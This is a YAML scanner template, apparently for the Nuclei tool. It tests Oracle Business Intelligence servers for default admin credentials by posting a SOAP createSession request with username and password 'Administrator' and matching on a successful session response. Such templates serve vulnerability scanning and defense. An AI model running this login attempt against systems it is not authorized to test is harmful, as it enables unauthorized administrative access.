common/config/pocs/businessintelligence-default-login.yaml

http:
    - attack: pitchfork
      matchers:
        - status:
            - 200
          type: status
        - part: body
          type: word
          words:
            - createSessionReturn
      matchers-condition: and
      payloads:
        password:
            - Administrator
        username:
            - Administrator
      raw:
        - |
          POST /xmlpserver/services/XMLPService HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/xml
          SOAPAction: ""
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

          <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:rep="http://xmlns.oracle.com/oxp/service/report">
             <soapenv:Header/>
             <soapenv:Body>
                <rep:createSession soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                   <username xsi:type="xsd:string">{{username}}</username>
                   <password xsi:type="xsd:string">{{password}}</password>
                   <domain xsi:type="xsd:string">bi</domain>
                </rep:createSession>
             </soapenv:Body>
          </soapenv:Envelope>
id: oracle-business-intelligence-login
info:
    author: milo2012
    classification:
        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
        cvss-score: 8.3
        cwe-id: CWE-522
    description: Oracle Business Intelligence default admin credentials were discovered.
    metadata:
        max-request: 1
    name: Oracle Business Intelligence Default Login
    reference:
        - https://docs.oracle.com/cd/E12096_01/books/AnyDeploy/AnyDeployMisc2.html
    severity: high
    tags:
        - oracle
        - default-login
        - Oracle-Business-Intelligence
        - LPSE
        - ilo
